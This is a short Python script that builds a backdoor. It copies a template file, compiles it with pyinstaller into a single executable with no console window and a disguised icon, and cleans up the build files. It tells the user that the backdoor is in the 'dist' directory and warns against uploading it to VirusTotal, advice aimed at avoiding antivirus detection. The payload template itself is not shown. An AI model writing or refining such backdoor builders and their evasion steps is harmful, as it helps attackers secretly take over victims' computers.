import os
import subprocess
from sys import platform as OS

def clear_screen():
    if OS.startswith("linux"):
        os.system("clear")

def build_backdoor():
    import shutil

    template_path = "main.py"
    try:
        with open(template_path, 'r', encoding='utf-8') as f:
            file = f.read()
            filename = f"sn0wflake.py"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(file)
            py_cmd = [
                "pyinstaller",
                "--onefile",
                "--noconsole",
                "--icon=img/exe_file.ico",
                filename
            ]
            subprocess.call(py_cmd)
            for ext in [".spec"]:
                try:
                    os.remove("sn0wflake" + ext)
                except FileNotFoundError:
                    pass

            shutil.rmtree("build", ignore_errors=True)

            print('\n[+] The Backdoor can be found inside the "dist" directory')
            print('\nDO NOT UPLOAD THE BACKDOOR TO VIRUS TOTAL')
       
    except Exception as e:
        print(f"[!] Error reading template: {e}")
        return
    


def main():
    clear_screen()
    while True:
        try:
            print("[+] Building backdoor...")
            build_backdoor()
        except KeyboardInterrupt:
            print("\n\n[+] Exiting")
            break

if __name__ == "__main__":
    main()